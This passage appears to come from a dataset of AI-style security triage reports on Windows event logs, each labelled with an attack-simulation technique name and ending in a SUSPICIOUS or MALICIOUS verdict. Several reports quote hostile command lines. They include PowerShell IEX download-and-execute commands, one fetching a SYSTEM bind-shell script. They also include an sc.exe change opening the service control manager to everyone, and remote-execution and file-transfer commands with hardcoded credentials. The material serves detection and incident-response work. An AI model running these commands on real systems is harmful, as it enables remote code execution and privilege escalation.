There are clear signs of malicious activity involving scripting, external resource downloading, and manipulation of system processes in a manner consistent with known attack vectors. 

### Recommendations:
1. **Immediate Response**: Isolate the affected system from the network to prevent any potential spread of infection or data exfiltration.
2. **Forensic Analysis**: Conduct a deeper forensic investigation to determine if any malicious payloads have been executed and identify any persistence mechanisms present.
3. **Patch Management**: Ensure all systems have the latest security updates applied to reduce vulnerabilities.
4. **User Training**: Educate users about the risks associated with running command shells/scripts, particularly those that download third-party executables.
5. **Network Monitoring**: Increase the monitoring of network traffic for any connections attempting to communicate with suspicious external addresses."
Modifying ACL of Service Control Manager via SDET,"Upon reviewing the Windows event logs provided, I have conducted a detailed analysis, focusing on any indicators of suspicious or malicious activity. Here's the summary:

1. **Time Changes and Synchronization**:
   - There are several entries related to time changes and synchronization. Event ID 4616 in Security logs shows time change events. It appears to be a legitimate synchronization with a time source (time.windows.com), which is common in system operations for maintaining accurate system time.

2. **Edge Update Activity**:
   - The logs show extensive activities associated with Microsoft Edge Update (events involving `MicrosoftEdgeUpdate.exe` and related helper services). This is expected behavior during automatic updates for Edge. The command-line arguments and operations appear consistent with legitimate update processes.
   - The hash values for `MicrosoftEdgeUpdate.exe` remain consistent, indicating no tampering between different executions.

3. **Privilege Changes and Process Executions**:
   - Notably, there is a command execution involving `cmd.exe` with `sc.exe sdset scmanager D:(A;;KA;;;WD)`, which modifies permissions for the service control manager to allow key access to everyone (WD stands for ""World""). This can potentially be leveraged for privilege escalation or lateral movement, making it suspicious. This manipulation of service permissions should not be present in typical operations and might be indicative of an attempted or successful privilege escalation.

4. **Execution of Windows Tools**:
   - Several Windows utilities like `whoami.exe`, `wevtutil.exe`, `HOSTNAME.EXE`, and `conhost.exe` being executed with the user `SERVER002\\admin_test`. While the execution of these utilities itself can be considered normal, in the context of command-line permissions changes and the high frequency in a short span, it may require further investigation to rule out misuse.

**Conclusion**:

- **Resolution**: **SUSPICIOUS**

The activity related to changing service permissions using `sc.exe` is anomalous and unexplained by typical legitimate user actions, and thus warrants further investigation. While core operations, like Edge updates, appear benign, the combination of observed service permission changes and executions can be indicative of a potential security threat or improper configuration, necessitating additional scrutiny.

**Guidance on How to Proceed**:
- Investigate the user `admin_test`'s activities and check for any unauthorized actions or deviations from expected behavior patterns.
- Review any service modifications and run integrity checks on affected services.
- Conduct a forensic examination of the system, focusing on traces of privilege escalations or lateral movements.
- Consider deploying additional monitoring and alerting on similar permission changes to preemptively catch and stop malicious activities."
Headless Chrome code execution via VBA,"### Detailed Analysis:

Upon reviewing the provided logs, I have identified several noteworthy activities:

1. **PowerShell Execution:**

   - A series of PowerShell events shows the execution of a script downloaded from a GitHub URL. The command:
     ```
     powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     IEX (iwr ""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1"" -UseBasicParsing)
     Invoke-script -macroFile ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\src\\chromeexec-macrocode.txt"" -officeProduct ""Word"" -sub ""ExecChrome""}
     ```
     indicates the use of PowerShell to download and execute a potentially malicious script.

   - This type of activity is often associated with malicious actions, such as malware download or execution.

2. **Sysmon Logs:**

   - The Sysmon logs show that PowerShell was executed by the user `SERVER002\\admin_test`, aligned with the potentially malicious PowerShell activity.
   
   - There are frequent executions of `wevtutil.exe` and `conhost.exe` initiated by the same user. While `wevtutil.exe` is a legitimate utility for managing Windows Event Logs, its use by unauthorized users may indicate an attempt to hide or modify logs to cover up malicious activities.

3. **EdgeUpdate Activity:**

   - Multiple instances of `MicrosoftEdgeUpdate.exe` are logged. Update processes for applications like Microsoft Edge are common, but it is important to ensure these updates are legitimate and not being used as a vector for malware delivery.

### Assessment:

**Indicators of Malicious Activity:**

- The execution of scripts directly from an external source using PowerShell is anomalous and highly suspicious, indicating potential script-based attacks.
  
- Given the context of Sysmon and PowerShell events, there is strong evidence pointing towards possible compromise or unauthorized activities such as privilege escalation or persistence mechanisms hidden within legitimate operations.

### Recommendation:

- **Resolution: MALICIOUS**

The activities captured in the logs strongly suggest malicious behavior. Immediate actions should include:
- Isolating the affected host to prevent further propagation or external communication.
- Performing a full malware scan and system integrity check.
- Reviewing network and firewall logs for anomalies.
- Considering the credentials used (`admin_test`), and verifying if it's potentially compromised or misused.

---

These actions will help mitigate the risk and understand the full scope of the compromise. Additional forensic analysis may be necessary to identify the full extent of the infiltration and to ensure that all traces of the malicious activity are removed."
Command prompt writing script to file then executes it,"**Detailed Analysis of the Logs**

### Security Log
- **EventID 4616**: The Security log entries are primarily about time changes performed by the svchost.exe process running under the LOCAL SERVICE account. This behavior in isolation, especially when occurring multiple times within a short period, could be indicative of normal time synchronization activities unless corroborated by other suspicious activities.

### Application Log
- Various **edgeupdate** log entries indicate that the Edge Update service stopped multiple times. This could be part of normal update behavior or potentially an issue with the service execution. There's no obvious indication of malicious activity given these logs alone.

### Sysmon Log
- **Process Creation Events (EventID 1)**: Observing several legitimate processes such as Microsoft Edge Updater, HOSTNAME.EXE, WHOAMI.EXE, and CMD.EXE being executed under expected circumstances. 
  - **Microsoft Edge Updates**: Multiple entries related to Microsoft Edge Update processes indicate update operations typical of enterprise managed environments.
  - **CMD and WScript/VBScript usage**: A series of commands involving CMD.EXE and VBScript (WScript) could indicate script-based automation or possibly a form of lateral movement or information gathering if these processes were not expected. The VBScript is creating a whoami command inside a temporary directory which may need further attention.
  
- **Process Termination Events (EventID 5)**: Many processes appear to be executed and terminated, which aligns with the vagaries of typical system and user administration tasks involving system tools and update managers executing and terminating upon completion.

### System Log
- Typical log entries involving time changes and synchronization with `time.windows.com` appear benign. This is consistent with standard system behavior.

### Assessment
- **Benign Behavior**:
  - Many of the logs indicate processes that are typical to regular update operations (e.g., Microsoft Edge) and time synchronization mechanisms.
  - The use of svchost.exe in time synchronization reflects regular operations associated with system timekeeping and network time protocols.

- **Suspicious Behavior**:
  - The CMD and VBScript execution is somewhat suspicious due to the context (temporary directory and ""whoami"" execution), but this alone does not constitute malicious activity without evidence of further exploitation or privilege escalation attempts.
  - While logging whoami outputs might be used for legitimate auditing activities, it might also hint at reconnaissance activities if seen in a broader malicious context.

### Recommended Resolution: **SUSPICIOUS**

Although much of the activity aligns with regular system operations and updates, the presence of scripted command executions related to ""whoami"" suggests this should be flagged and monitored. It warrants deeper investigation to rule out any unauthorized use or scripting aimed at reconnaissance or lateral movement actions within the system. Further scrutiny is advised: 
- Verify the origin and necessity of the script execution.
- Examine user accounts and permissions related to the creation and execution of these scripts.
- Cross-reference this activity with any alerts from network monitoring or endpoint security solutions to ensure there is no broader context indicative of compromise."
WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique,"Upon reviewing the provided Windows event logs across different channels (Sysmon, PowerShell, Application, System, and Security), the following observations and analyses can be made:

### Suspicious or Anomalous Behavior:
1. **Execution of PowerShell Script:**
   - The critical activity observed is the execution of a PowerShell command that uses `Invoke-Expression` (iex) to download and execute a PowerShell script from a GitHub URL (`https://raw.githubusercontent.com/script/script-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1`). 
   - The command: `""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}` 
   - This represents a highly suspicious action, as it involves remote script execution which could install malware or exploit vulnerabilities on the host system.

2. **Unusual Frequent Invocation of System Utilities:**
   - Regular system utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` were repeatedly executed in a short time window.
   - Although these executables are legitimate Windows utilities, their rapid execution in sequence without any legitimate application or service context in this timespan is noteworthy. The frequent invocation of these can indicate a reconnaissance phase of an attack or part of a more complex script execution.

### Indicators of Malicious Activity or Compromise:
- **PowerShell Usage with External Network Access:**
  - Using PowerShell to execute scripts from an external source is a common tactic among attackers for downloading additional malicious payloads or scripts. This specific action is a prevalent indication of malicious behavior.
  
### Assessment of the Situation:
Given these logs and particularly the evidence of invoking potentially malicious external PowerShell scripts, there is a strong indication of malicious activity. The behavior observed aligns with techniques used in initial access or execution phases of an attack as per ATT&CK framework methodologies, such as:
- **T1059.001**: Command and Scripting Interpreter: PowerShell
- **T1105**: Ingress Tool Transfer

### Resolution:
- **MALICIOUS** - The logs contain activity that indicates the execution of potentially malicious commands, specifically the downloading and running of external PowerShell scripts. The use of external PowerShell script execution suggests an active compromise or at least the beginning stages of an attack.

### Guidance on How to Proceed:
1. **Immediate Incident Response:**
   - Isolate the affected system (Server002) from the network to prevent potential spread or communication with external malicious servers.
   
2. **Further Investigation:**
   - Conduct a deep forensic analysis of the host, including memory and disk analysis, to identify any malicious payloads dropped or additional indicators of compromise (IOCs).
   - Review network traffic for unusual connections, especially involving the GitHub URL or IPs associated with it during the time of the incident.

3. **Strengthening Security Posture:**
   - Implement strict PowerShell execution policies and logging.
   - Monitor and flag unusual script execution and network communications promptly.
   - Consider endpoint detection solutions that can identify malicious script execution in real-time."
Application uninstall using WMIC,"Upon reviewing the provided logs, here is a detailed analysis:

### Sysmon Log Analysis
- **PowerShell Execution**: There is a PowerShell instance executed by the `admin_test` user, however, the detailed command line arguments are not provided. Repeated execution of PowerShell without clear purpose can be a cause for concern, especially when run under high privilege accounts like an admin.
  
- **Multiple `wevtutil.exe` and `conhost.exe` executions**: Frequent execution of `wevtutil.exe`, a command-line utility for managing event logs, along with `conhost.exe` may seem abnormal but could also be part of routine administrative operations or automated scripts. However, the high frequency and specificity (log parsing or cleaning) have not been identified in this case.

- **`whoami` and `hostname` Commands**: These commands are executed to identify the current user and system name. While this can be part of a troubleshooting script, in a compromised environment, this can also be used to gather system information by an attacker.

- **WMIC Uninstall Command**: There is an execution of `cmd.exe` used to invoke `wmic` for uninstalling ""TightVNC"" software. This activity stands out as administrative but if not expected, it requires scrutiny to determine whether this was a legitimate action or potentially malicious.

- **Microsoft Edge Installer Execution**: The logs show the execution of Microsoft Edge installer processes. This could be a benign activity related to software updates, especially as it's running under `NT AUTHORITY\SYSTEM`, a legitimate system process.

### Event Logs Analysis
- **Application Logs**: The `MsiInstaller` events indicate installations or updates typical for system maintenance tasks like ""Microsoft Update Health Tools"" and a Windows update. These are common and legitimate activities in enterprise environments.

### Summary
- **Suspicious Activities**: The Sysmon logs highlight a series of processes executed by an administrative account (e.g., PowerShell, WMIC uninstall command), which can be routine but may also be leveraged for malicious purposes if unauthorized. The absence of detailed PowerShell command-line arguments precludes definitive conclusions about its intent.
  
- **Analysis Outcome**: None of the logs conclusively point to 100% malicious activity; however, the combination of `wmic` uninstall command, frequent uses of utilities like `wevtutil`, and PowerShell execution warrant further investigation to rule out potential misuse or compromise.

### Recommendation and Resolution
- **Resolution**: **SUSPICIOUS**
- **Actionable Steps:**
  - Confirm with the respective administrative team if they were performing any software removals or updates around the logged timestamps.
  - Investigate the PowerShell execution context further, focusing on any command-line arguments or scripts run.
  - Monitor for any further unexpected `wmic`, `wevtutil`, or `PowerShell` usage.
  - Enhance PowerShell logging and consider implementing tighter access controls around PowerShell and administrative utility usage.

This investigation indicates potentially suspicious activities that warrant additional scrutiny to ensure they are indeed benign."
Cobalt Strike post-exploitation pipe (before 4.2),"## Analysis

Upon analyzing the provided logs, I have identified several entries that suggest unusual and potentially malicious behavior:

1. **Process Execution and Command-Line Activity**:
   - There are multiple instances of PowerShell and command-line activity executed by the user `SERVER002\admin_test`. This includes the execution of `cmd.exe` with a suspicious command line that involves `namedpipes_executor.exe`.
   
   - The process execution of `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe` from locations within the user's `%TEMP%` directory indicates potentially unauthorized software installation and execution. The user `SERVER002\admin_test` demonstrates high integrity level access, suggesting possible privilege escalation.

2. **Usage of Administrative Tools**:
   - The repeated use of `wevtutil.exe`, a utility for exporting event logs, often correlates with log-clearing attacks or information gathering techniques by an adversary.

3. **Privilege Escalation and Elevated Token Usage**:
   - There are Windows security logs showing privilege escalation, evidenced by Event ID `4672`, which is triggered when a user with administrator privileges logs in or accesses the system.

4. **Network-Related Process**:
   - The presence of `svchost.exe` and `sppsvc.exe` under network and system authority accounts like `NT AUTHORITY\SYSTEM` and `NT AUTHORITY\NETWORK SERVICE` is usual for Windows; however, they require correlation with network activities for deeper analysis.

5. **Logon Events**:
   - The `LogonType` field with value `3` in the security log suggests network logon, indicative of a remote connection.

6. **Timing and Co-occurrences**:
   - Rapid occurrences of process executions and commands in quick succession within one second suggest automated script or malware activity.

## Conclusion
Based on the gathered evidence, the logs indicate potentially unauthorized and suspicious behavior involving the execution of possibly malicious executables and administrative utilities. The use of high integrity level tokens and involvement of named pipe operations suggests a likelihood of malicious activity.

### Resolution:
**SUSPICIOUS** – The logs contain activity that appears unauthorized and should be investigated further. Immediate steps should include:
- Verifying the authenticity and necessity of the scripts/executables found in `%TEMP%` folders.
- Conducting a comprehensive security check for known vulnerabilities and unauthorized changes.
- Checking for external connections associated with the `namedpipes` programs and logging all related network activity.
- Reviewing user `SERVER002\admin_test` activities and access permissions.
  
### Guidance and Next Steps:
- Isolate the affected machine to prevent further propagation of any potential threat.
- Perform a thorough threat-hunting operation to look for IOCs (Indicators of Compromise) and any persistence mechanisms.
- Engage with the response team to perform a full investigation, including forensic analysis of the involved executables.
- Implement stricter monitoring and logging policies to capture detailed activities for future analysis."
Run BloodHound from local disk,"Upon reviewing the provided Windows event logs, here is a breakdown of the findings:

### Suspicious Activities Detected

1. **PowerShell Execution**: 
   - There are multiple events involving the execution of PowerShell with a specific script `script.ps1` located in a temporary directory. This action is often associated with malicious activity when scripts are executed from unusual paths, especially under administrative accounts (`SERVER002\\admin_test`).
   - Specific PowerShell command:
     ```
     ""powershell.exe"" & {import-module \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.ps1\"", try {Invoke-script -OutputDirectory $env:Temp}, catch { $_; exit $_.Exception.HResult}, Start-Sleep 5}
     ```

2. **Event Log Manipulation**:
   - The use of `wevtutil.exe` to export event logs (`epl Microsoft-Windows-Sysmon/Operational C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\TempLog.evtx`), which might indicate an attempt to tamper or clear logs, is suspicious, especially since it is linked to the `admin_test` user.

3. **Credential Access Attempts**:
   - Security events `5379` and `4798` indicate attempts to access or request credentials. The failure to return credentials (`ReturnCode: 3221226021`) might indicate unsuccessful attempts to gather sensitive data.

4. **Consecutive High-Privilege Activity**:
   - The use of several sensitive privileges (such as `SeDebugPrivilege`) listed under security event `4672` suggests a high privilege operation which could potentially lead to privilege escalation if unchecked.

### Assessment

Based on the logs, there are multiple indicators of potentially malicious activity, primarily revolving around unauthorized script execution and attempts at accessing sensitive information or logs. PowerShell is executed with non-standard scripts, and there are unexplained credential access attempts.

### Guidance and Resolution

1. **Immediate Actions**:
   - Investigate the details and origin of the suspicious PowerShell script `script.ps1`. Confirm its legitimacy and purpose.
   - Review the intent and source of the `wevtutil.exe` usage to understand if event log tampering is occurring.
   - Check the integrity and security settings around the user `admin_test` who appears to be the main actor in these activities.

2. **Security Enhancements**:
   - Strengthen PowerShell logging and script execution policies to alert administrators of unusual PowerShell activities.
   - Implement stricter access controls to critical logs and sensitive commands/utilities like `wevtutil.exe`.

3. **Further Investigation**:
   - Conduct a full forensic investigation to determine whether data exfiltration or system compromise occurred.
   - Monitor network traffic for any unusual or unauthorized outbound connections that might complement the activities observed.

### Conclusion

The resolution based on the observed behaviors in the logs is **SUSPICIOUS**. There are definite red flags warranting immediate investigation and potential containment measures. Further analysis may reveal if these activities can be classified explicitly as malicious."
Office launching .bat file from AppData,"Upon reviewing the Windows event logs provided, I have identified several entries indicative of potentially malicious activity. Here's a detailed analysis of the suspicious behavior observed:

1. **PowerShell Execution**:
   - Multiple logs indicate execution of PowerShell with a specific script fetched from an external URL: `https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1`. PowerShell commands are often used in malicious activities due to their ability to execute scripts that can download and execute further payloads without writing to disk.
   - The command-line argument used suggests an intent to manipulate network configurations and execute a script that involves writing and running a batch file (`ardata.bat`) with instructions to open `calc.exe`. This behavior is typical of a script trying to execute commands on the system surreptitiously.

2. **Process Creation Events**:
   - There are logs showing the creation of processes such as `whoami.exe`, `hostname.exe`, and `wevtutil.exe`. While these are legitimate Windows processes, their invocation following a PowerShell script fetch suggests an attempt to gather system information and manipulate event logs, which are typical post-exploitation activities for attackers trying to cover their tracks or confirm system access.

3. **High Integrity Level Execution**:
   - Processes are executed at a high integrity level, which suggests that they are running with elevated privileges. This is suspicious because it implies that these actions could modify system settings or escalate privileges unauthorizedly.

4. **Use of `wsmprovhost.exe` as Parent Process**:
   - The parent process for some of the spawned processes is `wsmprovhost.exe`, a legitimate process related to Windows Remote Management. However, its use here is suspicious due to its involvement as a parent process for numerous other processes identified in the Sysmon logs.

### Assessment
- **Indicators of Compromise (IoC)** are present through the use of PowerShell to download and execute a potentially malicious script, attempts to execute shell commands, and log manipulation. These activities are typically associated with an ongoing or successful compromise.

### Conclusion
Based on the analysis, the logs indicate **MALICIOUS** activity likely involving post-exploitation actions to obfuscate traces and maintain persistence on the host system. The invocation of PowerShell with an external script and the subsequent process executions are key indicators of a compromise.

### Recommendations
1. **Immediate Isolation**: Isolate `Server002` from the network to prevent further lateral movement or data exfiltration.
2. **Malware Analysis**: Analyze the script downloaded from the external URL to understand its full capabilities and objectives.
3. **Forensics Investigation**: Conduct a deeper forensic analysis to identify potential data compromised and the extent of the attacker’s actions.
4. **Patch and Harden**: Ensure all scripts are blocked from being executed via PowerShell and apply patches to all systems to mitigate known vulnerabilities.
5. **Review and Monitor**: Implement tightened monitoring and alerting mechanisms, especially around sensitive commands like PowerShell activities and unauthorized access attempts."
Use RemCom to execute a command on a remote host,"Upon reviewing the provided Windows Sysmon event logs, the focus is primarily on identifying any indicators of malicious activity. As per the logs:

1. **PowerShell and Execution Activity**:
   - **Powershell.exe (ProcessId 6684)**: The execution of PowerShell by `SERVER002\admin_test` indicates script execution or command processing. This is inherently suspicious due to PowerShell's extensive use in attack vectors, especially if it's not a routine process in this context.

2. **Wevtutil and Conhost**:
   - **Wevtutil.exe (ProcessId 7012, 6780, 4152, etc.)**: This utility is typically used for managing Windows event logs. Frequent and close-time execution along with `conhost.exe` is not inherently suspicious alone, but it is worth noting due to its potential use in clearing or exporting logs to cover tracks.
   - **Conhost.exe**: This repeatedly appears alongside `wevtutil`, suggesting interactive management of logs or console processes.

3. **Remcom.exe Execution**:
   - **Cmd.exe (ProcessId 6884)** initiates a suspicious command-line sequence involving `remcom.exe`. This utility is known for enabling remote command execution, potentially to facilitate lateral movement or remote shell access. The inclusion of credentials (`/user:Administrator /pwd:P@ssw0rd1`) is a significant red flag indicating a possible unauthorized remote command execution attempt.

4. **ProcComs.bin**:
   - **ProcComs.bin (ProcessId 6676)**: A binary file executed with specific user credentials. This indicates custom or potentially unwanted software development files running, which could be indicative of custom malicious actions aligned with exploits or backdoors.

5. **Microsoft Edge Update Activity**:
   - **MicrosoftEdgeUpdate.exe and Installers**: The execution of `MicrosoftEdgeUpdate.exe` followed by activity related to installation or updating processes is expected and typically benign. This is common behavior during legitimate browser updates.

### Assessment

The logs signal potentially **SUSPICIOUS** activity, particularly around the usage of `remcom.exe` with explicit credentials and the involvement of `ProcComs.bin`. These activities could indicate lateral movement or unauthorized access attempts. The recurring initiation of critical system utilities (`wevtutil` and `conhost`) align with possible log manipulation activities, although in isolation, they might not strictly indicate malicious activity without additional context.

### Resolution: **SUSPICIOUS**

### Guidance on How to Proceed:
- **Further Investigation**: Conduct a deeper forensic analysis on `SERVER002` to confirm whether `remcom.exe` use was authorized and aligned with IT tasks. 
- **Network Access Reviews**: Check for any anomalous remote access attempts preceding or following these logs.
- **Malware Scanning**: Perform a full antivirus/anti-malware scan focusing on the processes where behavior indicates potential compromise indicators.
- **Credentials Review**: Ensure the credentials observed (`Administrator` with provided password) have not been compromised. Assess logon audits for unusual patterns.
- **User Context Investigation**: Confirm with `admin_test` or IT staff if these activities correlate with any authorized maintenance or administrative routines.

This type of analysis often necessitates corroborating the machine's history, alert patterns, and any associated network logs to confirm or rule out malicious intentions."
Execute PowerShell script via Word DDE,"Upon reviewing the provided logs, I noted the following activities and their implications:

### Application Log
- The application logs show the `edgeupdate` service being stopped twice within a short time frame. This does not inherently indicate malicious activity, as such services can sometimes be stopped due to updates or system maintenance.

### Sysmon Log
- Frequent execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. These processes are legitimate Windows system utilities. `wevtutil.exe` is used for managing Windows event logs, which is not inherently suspicious but should be verified whether it was expected behavior for this timeframe, especially for an admin user like `admin_test`.
- The execution of `cmd.exe` from a temporary directory with a suspicious command line starting a document (`DDE_Document.docx`). This pattern often correlates with malicious activity, where documents are used to execute commands or scripts as part of a malware infection or phishing.
- Several instances of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) running under the `SYSTEM` user are noted, which are typically indicative of legitimate update activities, but should be confirmed with expected schedules.
- The execution of Windows utilities like `whoami.exe` and `hostname.exe` by `SERVER002\admin_test` are noted, which might be used for enumeration or verification tasks by an authenticated user but could also be indicative of a potential reconnaissance step if unauthorized.

### Security Log
- Time synchronization events and multiple failed credential retrieval attempts (`Event ID 5379`), with return code `3221226021`, suggest failed authentication attempts. These could be part of legitimate errors or an attack like password spraying but require further validation against user access logs and policies.

### System Log
- System level time adjustments and NTP synchronization logs appear, which are normal operations.

### Analysis
- **Suspicious Command Execution**: The `cmd.exe` context running a document from a temp directory looks suspicious and may suggest a macro or script trying to execute as part of a phishing attempt.
- **Repeated System Process Starts**: While edge updates and system processes starting are typical, their frequency and context might necessitate a detailed review of update logs to dismiss the possibility of a system-specific exploitation attempt.

### Resolution
Based on the provided data, the activities range from normal user and system administrative tasks to potentially suspicious. The `cmd.exe` invocation with document opening and the frequency and nature of certain executions edge this analysis towards suspicion.

**Final Resolution: SUSPICIOUS**

### Recommendations:
1. **Enhanced Monitoring**: Implement real-time process creation monitoring to detect similar activities in the future.
   
2. **Audit User Activity**: Verify the administrative actions of `SERVER002\admin_test` during this timeframe to confirm their legitimacy.

3. **Review Scheduled Tasks & Updates**: Validate that the Edge updates align with expected schedules for this system.

4. **Conduct a Phishing Drill**: Ensure users are trained about malicious documents and have awareness programs in place.

5. **Isolate and Investigate**: If possible, further investigate the document mentioned in the suspicious `cmd.exe` startup to understand its source and intent.

Further investigation and additional context are required to definitively rule out or confirm malicious intent."
WMI Execute Local Process,"Upon reviewing the provided Windows event logs from various sources:
 
**1. Windows PowerShell Log**
- This log is empty, indicating no recorded PowerShell activities.

**2. Application Log**
- The entries here are related to the Microsoft-Windows-Security-SPP (Software Protection Platform) events, specifically Event IDs 16384 and 16394. These events are typical for SPP, involving routine software licensing checks and operations. Nothing here appears malicious or anomalous.

**3. Security Log**
- This log is empty, suggesting no pertinent security events were recorded or that logging might not have been configured effectively.

**4. Sysmon Log**
- A series of Sysmon events were captured, primarily Event ID 5 (Process Terminated) and Event ID 1 (Process Create).

**Detailed Observations:**
- The creation and termination of typical Windows utility processes like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `cmd.exe`, and `notepad.exe` were logged. These are generally benign, but frequency and context are important.
- A particularly notable event is the sequence involving `cmd.exe` executing `wmic process call create notepad.exe`. This activity should be scrutinized further as using `wmic` to spawn processes can be used for automation but might also be leveraged by an attacker for lateral movement or executing payloads unexpectedly.
- The `MicrosoftEdge_X64_130.0.2849.46_129.0.2792.89.exe` update events for Microsoft Edge appear legitimate; they include system-level privileges, command-line arguments usually seen with application installations or updates, and originate from Microsoft file paths.
- No evidence of anomalous command-line argument usage or privilege escalation techniques emerged from Sysmon entries.

**Assessment and Conclusion**:

**Resolution: SUSPICIOUS**

The logs exhibit primarily benign activities, however, the use of WMI (`wmic`) to create processes deserves additional scrutiny. While it can be a legitimate system administration or automation practice, it's often examined closely in security contexts due to its potential misuse by attackers. This aspect of the logs warrants further investigation, such as checking the intent behind the process creation, whether it's an expected administrative task, and if similar activities occurred at unexpected times or frequency.

**Guidance on How to Proceed**:
1. Verify the legitimacy of the user actions associated with the `wmic` command.
2. Cross-reference these Sysmon logs with user activity or administrative logs to ensure the behavior aligns with routine tasks or expected activity.
3. Strengthen monitoring for WMI-based activities, and possibly implement stricter controls or more granular logging to distinguish benign usage from potential anomalies.
4. Confirm with the system or application owners if any automation or scripts might be using these tools, particularly evidencing increase process creations via `wmic`.

This assessment encourages diligent verification and monitoring due to potential misuse while currently identifying no overtly malicious executions."
Potentially Unwanted Applications (PUA),"### Detailed Analysis:

The investigation conducted on the provided Windows event logs included the Application, Security, System, Windows PowerShell, and Sysmon logs.

1. **Application Log:**
   - An entry indicates that Windows Defender is running and in a ""SECURITY_PRODUCT_STATE_ON"" state. This is typical and shows that the system's antivirus solution is active.

2. **System Log:**
   - NTP synchronization with time.windows.com is recorded, which is standard for maintaining accurate system time.
   - Two Windows Update Client events show an update to Microsoft Defender Antivirus was completed, which is routine and suggests the system is being updated and maintained properly.

3. **Windows PowerShell Log:**
   - Entries show PowerShell executing a command: `Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe` followed by an immediate execution of the downloaded file. This behavior is suspicious because downloading and executing a file directly through scripting can indicate potential malicious intent or misconfiguration.
   - The website used is known for testing antivirus and security solutions, which might imply testing activity rather than immediate malicious intent.

4. **Sysmon Log:**
   - Several entries show normal system utility usage by the user ""SERVER002\\admin_test,"" like querying system information with `whoami.exe` and `hostname.exe`, and using standard services like `svchost.exe`.
   - There's also a critical entry where `PotentiallyUnwanted.exe` is executed, which corroborates suspicious PowerShell activity. The hash values for the executables should be further analyzed against known malicious databases to confirm their status.

### Assessment and Findings:

The behaviors in the PowerShell and Sysmon logs, particularly the download and execution of `PotentiallyUnwanted.exe`, stand out as potential red flags. Although this executable originates from a site used to test security solutions, it is essential to determine whether this action aligns with legitimate testing practices authorized within the organization.

### Resolution: SUSPICIOUS

1. **Immediate Actions:**
   - Verify if there was authorized testing that involved the use of the EICAR test file or equivalent methodology.
   - Review the script executed via PowerShell for any unauthorized execution of similar commands and check integrity using hash validation.

2. **Further Investigation Needed:**
   - Audit any other activity associated with the user ""SERVER002\\admin_test"" around the time of this incident.
   - Verify the network and endpoints for any unauthorized scripts or activity beyond this specific event.

Ultimately, while direct malicious intent is not confirmed, the actions are suspicious enough to warrant further investigation to ensure that the activity aligns with authorized internal testing procedures or to identify if corrective measures are needed for potential unauthorized actions."
ESXi - Install a custom VIB on an ESXi host,"**Detailed Analysis of the Windows Event Logs:**

**Suspicious or Anomalous Behavior:**

1. **Use of Powershell and Command Line Tools**:
   - The logs show multiple command line tools being launched, such as `cmd.exe`, `wevtutil.exe`, `pscp.exe`, and `plink.exe`. This pattern of activity is often indicative of potential malicious behavior, as adversaries frequently use these tools for lateral movement, data exfiltration, and executing commands on remote systems.
   - Specific command line entries such as:
     - `cmd.exe /c C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\pscp.exe -pw pass ...`
     - This demonstrates an attempt to use PuTTY's `pscp.exe` for file transfers, including a hardcoded password, which is a significant security risk and suggests unauthorized data transfer.

2. **Frequent Execution of System Utilities**:
   - There are repeated executions of system-based executables like `conhost.exe`, `wevtutil.exe`, and `rundll32.exe`. While not explicitly malicious, the frequency and association with `PowerShell` and external connectivity tools raise concerns.

3. **Credentials and Privilege Events**:
   - Security logs indicate the presence of privilege escalation with entries such as Event ID 4672, indicating the granting of several high-level privileges. These entries are typical when a process runs with elevated permissions, which is fine if expected and justified by standard operational procedures. However, given the context, they may hint at privilege misuse.

4. **Presence of External File Transfer Tools**:
   - Execution of `pscp.exe` and `plink.exe` from the PuTTY suite suggests that files might be transferred to an external destination, potentially indicating data exfiltration attempts. These tools are commonly used for SSH and SCP operations.

**Potential Malicious Activity or Compromise:**

- The use of `cmd.exe`, `pscp.exe`, and the inclusion of directly hardcoded passwords can point towards attempts at unauthorized access or data exfiltration to a remote server (`root@file.local:/tmp` displayed in the command) using unauthorized methods.
- The combination of repetitive use of built-in Windows tools with elevated privileges and the presence of external file transfer tools in a single sequence suggests possible compromise or misuse.

**Assessment of the Situation:**

Given the combination of behavior observed—unauthorized command line execution, privilege escalation, use of potentially malicious tools (with a specific interest in `pscp.exe` and `plink.exe`), and attempts at external connections—there is a strong indication of suspicious activity that could be or lead to a security breach.

**Resolution:**

**SUSPICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Actions**:
   - Isolate the system (`Server002`) to prevent potential further data exfiltration or lateral movement within the network.
   - Change potentially compromised credentials, especially those related to `admin_test` and any other accounts noted in suspicious activities.

2. **Investigative Steps**:
   - Conduct a full forensic analysis of `Server002` to uncover additional evidence or command histories that might reveal the objectives and methods of the unauthorized activities.
   - Analyze network logs to trace attempted or successful connections to external IPs or domains, specifically targeting those related to the actions observed (e.g., `file.local`).

3. **Strengthen Security Posture**:
   - Implement stronger access controls and segregation of duties to minimize privilege misuse.
   - Enhance monitoring of command execution and tool usage, especially those known to be exploited by malicious actors, such as `PowerShell` with verbose logging enabled.
   - Educate employees and users about the dangers of hardcoding passwords and using potentially exploitable command line utilities."
WMI Execute Remote Process,"### Detailed Analysis of the Provided Windows Event Logs:

#### 1. **Suspicious Behavior Detected**:

- **Time Change Events (Event ID 4616 & 1)**:
  - Multiple events show system time being changed back slightly. Although this can happen for legitimate reasons, it can also indicate attempts to cover tracks by intruders (""anti-forensics"").
  - Process involved in the time change is `svchost.exe`, which is commonly abused by malware or intruders due to its nature of hosting multiple services.

- **Privileged Logon with Admin Rights (Event ID 4672 & 4624)**:
